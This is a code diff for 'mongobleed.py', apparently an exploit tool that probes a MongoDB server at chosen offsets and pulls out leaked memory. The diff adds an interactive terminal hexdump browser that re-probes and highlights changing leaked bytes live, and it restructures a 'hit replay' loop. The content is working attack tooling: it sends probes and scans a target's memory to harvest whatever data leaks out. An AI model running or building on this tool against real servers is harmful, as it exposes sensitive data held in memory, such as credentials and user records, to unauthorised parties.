@@ -25,10 +25,19 @@ import time
 import warnings
 import zlib
 import random
+import sys
+import termios
+import tty
+import queue
+import atexit
 from collections import deque
 
 from rich.console import Console
 from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
+from rich.live import Live
+from rich.table import Table
+from rich.text import Text
+from rich.console import Group
 from urllib.parse import unquote_to_bytes
 
 FIELD_NAME_RE = re.compile(rb"field name '([^']*)'")
@@ -186,6 +195,7 @@ def main():
         "  python3 mongobleed.py --host <target> --auto --auto-mode size\n"
         "  python3 mongobleed.py --host <target> --auto --auto-legacy\n"
         "  python3 mongobleed.py --host <target> --optimize --loop --decode\n"
+        "  python3 mongobleed.py --host <target> --tui --loop\n"
         "  python3 mongobleed.py --hit <token>\n"
         "  python3 mongobleed.py --hit <token> --hit-wiggle 32 --loop\n"
         "  python3 mongobleed.py --host <target> --dump 10MB\n"
@@ -239,6 +249,9 @@ def main():
                         help='Auto-tune objective: speed (bytes/sec) or size (max bytes)')
     parser.add_argument('--optimize', action='store_true',
                         help='Smarter scan strategy with sampling, hot offsets, and backoff')
+    parser.add_argument('--tui', action='store_true', help='Interactive TUI hexdump browser')
+    parser.add_argument('--tui-rows', type=int, default=16, help='Rows to render in TUI')
+    parser.add_argument('--tui-refresh', type=float, default=1.0, help='TUI refresh interval (seconds)')
     parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
     args = parser.parse_args()
 
@@ -417,6 +430,81 @@ def main():
         raw = base64.urlsafe_b64decode(token + pad)
         return json.loads(raw.decode("utf-8"))
 
+    def _key_listener(q, stop_event):
+        fd = sys.stdin.fileno()
+        try:
+            old = termios.tcgetattr(fd)
+            tty.setraw(fd)
+        except Exception:
+            return
+
+        def restore():
+            try:
+                termios.tcsetattr(fd, termios.TCSADRAIN, old)
+            except Exception:
+                pass
+
+        atexit.register(restore)
+        while not stop_event.is_set():
+            ch = sys.stdin.read(1)
+            if not ch:
+                continue
+            if ch == "\x03":
+                q.put("quit")
+                break
+            if ch == "q":
+                q.put("quit")
+                break
+            if ch == "\x1b":
+                seq = sys.stdin.read(2)
+                if seq == "[A":
+                    q.put("up")
+                elif seq == "[B":
+                    q.put("down")
+                elif seq == "[5":
+                    if sys.stdin.read(1) == "~":
+                        q.put("pageup")
+                elif seq == "[6":
+                    if sys.stdin.read(1) == "~":
+                        q.put("pagedown")
+        restore()
+
+    def _render_row_bytes(offset, data, last_change, now_ts):
+        hex_text = Text()
+        ascii_text = Text()
+        for i, b in enumerate(data):
+            age = now_ts - last_change[i]
+            if age < 0.5:
+                style = "bold green"
+            elif age < 1.5:
+                style = "yellow"
+            elif age < 3.0:
+                style = "dim"
+            else:
+                style = None
+            hex_text.append(f"{b:02x} ", style=style)
+            ascii_text.append(chr(b) if 32 <= b <= 126 else ".", style=style)
+        return hex_text, ascii_text
+
+    def _build_tui_table(base_offset, rows, row_bytes, row_changes, last_refresh, rate):
+        table = Table(title="MongoBleed TUI", expand=True)
+        table.add_column("Offset", justify="right", no_wrap=True)
+        table.add_column("Hex")
+        table.add_column("ASCII")
+        now_ts = time.time()
+        for idx in range(rows):
+            offset = base_offset + idx * 16
+            data = row_bytes.get(offset, b"\x00" * 16)
+            changes = row_changes.get(offset, [0.0] * 16)
+            hex_text, ascii_text = _render_row_bytes(offset, data, changes, now_ts)
+            table.add_row(f"{offset:08x}", hex_text, ascii_text)
+        status = Text(
+            f"base=0x{base_offset:x} rows={rows} refresh={last_refresh:.1f}s rate={rate:.1f}/s "
+            f"workers={args.workers} decode={'on' if args.decode else 'off'} optimize={'on' if args.optimize else 'off'}",
+            style="dim",
+        )
+        return Group(table, status)
+
     def auto_window_for_size(size):
         return max(1024, min(65536, size // 2048))
 
@@ -538,6 +626,7 @@ def main():
         console.print(f"[bold red][!][/bold red] {exc}")
         return
 
+    tui_base_offset = None
     if args.hit:
         try:
             hit = decode_hit_token(args.hit)
@@ -555,69 +644,145 @@ def main():
         if doc_len <= 0:
             console.print("[bold red][!][/bold red] Hit token missing doc_len.")
             return
-        base = doc_len
-        offsets = [base]
-        if args.hit_wiggle > 0:
-            offsets = list(range(base - args.hit_wiggle, base + args.hit_wiggle + 1))
+        tui_base_offset = doc_len
+        if args.tui:
+            # Skip hit replay and enter TUI below.
+            pass
+        else:
+            base = doc_len
+            offsets = [base]
+            if args.hit_wiggle > 0:
+                offsets = list(range(base - args.hit_wiggle, base + args.hit_wiggle + 1))
+            try:
+                while True:
+                    any_leaks = False
+                    valid_offsets = [o for o in offsets if o > 0]
+                    total_offsets = len(valid_offsets)
+                    with Progress(
+                        SpinnerColumn(),
+                        TextColumn(f"[bold cyan]Hit replay[/bold cyan] (workers={args.workers})"),
+                        BarColumn(),
+                        TextColumn("{task.completed}/{task.total}"),
+                        TextColumn("last={task.fields[last]:>7}"),
+                        TimeElapsedColumn(),
+                        console=console,
+                    ) as progress:
+                        task_id = progress.add_task("hit", total=total_offsets, last="-")
+                        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+                            futures = {
+                                executor.submit(
+                                    send_probe,
+                                    args.host,
+                                    args.port,
+                                    off,
+                                    off + args.buffer_extra,
+                                    args.timeout,
+                                ): off
+                                for off in valid_offsets
+                            }
+                            for future in concurrent.futures.as_completed(futures):
+                                off = futures[future]
+                                response = future.result()
+                                leaks = extract_leaks(response)
+                                progress.update(task_id, advance=1, last=str(off))
+                                if leaks:
+                                    any_leaks = True
+                                for data in leaks:
+                                    preview = ascii_preview(data, args.preview_bytes)
+                                    if args.decode:
+                                        variants = decode_variants(data, args.preview_bytes * 2)
+                                        if variants:
+                                            preview = " | ".join(variants)
+                                        else:
+                                            cleaned = decode_from_preview(preview, args.preview_bytes * 2)
+                                            if cleaned:
+                                                preview = cleaned
+                                    if (args.decode and not is_mostly_printable(preview)) or args.hex:
+                                        hexdump = hexdump_preview(data, args.preview_bytes)
+                                        console.print(f"[green][+][/green] hit offset={off} len={len(data):4d}:\n{hexdump}")
+                                    else:
+                                        console.print(f"[green][+][/green] hit offset={off} len={len(data):4d}: {preview}")
+                    if not any_leaks:
+                        console.print("[bold yellow][!][/bold yellow] No leaks for hit token.")
+                        if not args.loop:
+                            return
+                    if not args.loop:
+                        return
+                    time.sleep(args.hit_backoff)
+            except KeyboardInterrupt:
+                console.print("[bold yellow][!][/bold yellow] Ctrl+C detected, stopping hit replay.")
+                return
+    if args.tui:
+        base_offset = tui_base_offset if tui_base_offset is not None else args.min_offset
+        rows = max(1, args.tui_rows)
+        row_bytes = {}
+        row_changes = {}
+        key_q = queue.Queue()
+        stop_event = threading.Event()
+        listener = threading.Thread(target=_key_listener, args=(key_q, stop_event), daemon=True)
+        listener.start()
         try:
-            while True:
-                any_leaks = False
-                valid_offsets = [o for o in offsets if o > 0]
-                total_offsets = len(valid_offsets)
-                with Progress(
-                    SpinnerColumn(),
-                    TextColumn(f"[bold cyan]Hit replay[/bold cyan] (workers={args.workers})"),
-                    BarColumn(),
-                    TextColumn("{task.completed}/{task.total}"),
-                    TextColumn("last={task.fields[last]:>7}"),
-                    TimeElapsedColumn(),
-                    console=console,
-                ) as progress:
-                    task_id = progress.add_task("hit", total=total_offsets, last="-")
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+            with Live(auto_refresh=False, console=console, screen=True) as live:
+                last_time = time.time()
+                while True:
+                    now = time.time()
+                    elapsed = now - last_time
+                    if elapsed < args.tui_refresh:
+                        time.sleep(args.tui_refresh - elapsed)
+                    last_time = time.time()
+
+                    while not key_q.empty():
+                        key = key_q.get()
+                        if key == "quit":
+                            stop_event.set()
+                            return
+                        if key == "up":
+                            base_offset = max(0, base_offset - 16)
+                        elif key == "down":
+                            base_offset += 16
+                        elif key == "pageup":
+                            base_offset = max(0, base_offset - rows * 16)
+                        elif key == "pagedown":
+                            base_offset += rows * 16
+
+                    offsets = [base_offset + i * 16 for i in range(rows)]
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=min(args.workers, rows)) as executor:
                         futures = {
                             executor.submit(
-                                send_probe,
+                                send_probe_reuse,
                                 args.host,
                                 args.port,
                                 off,
                                 off + args.buffer_extra,
                                 args.timeout,
                             ): off
-                            for off in valid_offsets
+                            for off in offsets
                         }
                         for future in concurrent.futures.as_completed(futures):
                             off = futures[future]
-                            response = future.result()
-                            leaks = extract_leaks(response)
-                            progress.update(task_id, advance=1, last=str(off))
-                            if leaks:
-                                any_leaks = True
-                            for data in leaks:
-                                preview = ascii_preview(data, args.preview_bytes)
-                                if args.decode:
-                                    variants = decode_variants(data, args.preview_bytes * 2)
-                                    if variants:
-                                        preview = " | ".join(variants)
-                                    else:
-                                        cleaned = decode_from_preview(preview, args.preview_bytes * 2)
-                                        if cleaned:
-                                            preview = cleaned
-                                if (args.decode and not is_mostly_printable(preview)) or args.hex:
-                                    hexdump = hexdump_preview(data, args.preview_bytes)
-                                    console.print(f"[green][+][/green] hit offset={off} len={len(data):4d}:\n{hexdump}")
-                                else:
-                                    console.print(f"[green][+][/green] hit offset={off} len={len(data):4d}: {preview}")
-                if not any_leaks:
-                    console.print("[bold yellow][!][/bold yellow] No leaks for hit token.")
-                    if not args.loop:
-                        return
-                if not args.loop:
-                    return
-                time.sleep(args.hit_backoff)
+                            response, ok = future.result()
+                            data = b""
+                            if ok:
+                                leaks = extract_leaks(response)
+                                if leaks:
+                                    data = leaks[0]
+                            view = data[:16].ljust(16, b"\x00")
+                            prev = row_bytes.get(off, b"\x00" * 16)
+                            changes = row_changes.get(off, [0.0] * 16)
+                            now_ts = time.time()
+                            for i, b in enumerate(view):
+                                if i >= len(prev) or b != prev[i]:
+                                    changes[i] = now_ts
+                            row_bytes[off] = view
+                            row_changes[off] = changes
+
+                    rate = 1.0 / max(args.tui_refresh, 0.001)
+                    renderable = _build_tui_table(base_offset, rows, row_bytes, row_changes, args.tui_refresh, rate)
+                    live.update(renderable, refresh=True)
         except KeyboardInterrupt:
-            console.print("[bold yellow][!][/bold yellow] Ctrl+C detected, stopping hit replay.")
-            return
+            stop_event.set()
+            console.print("[bold yellow][!][/bold yellow] TUI interrupted.")
+        return
 
     if args.auto:
         try:
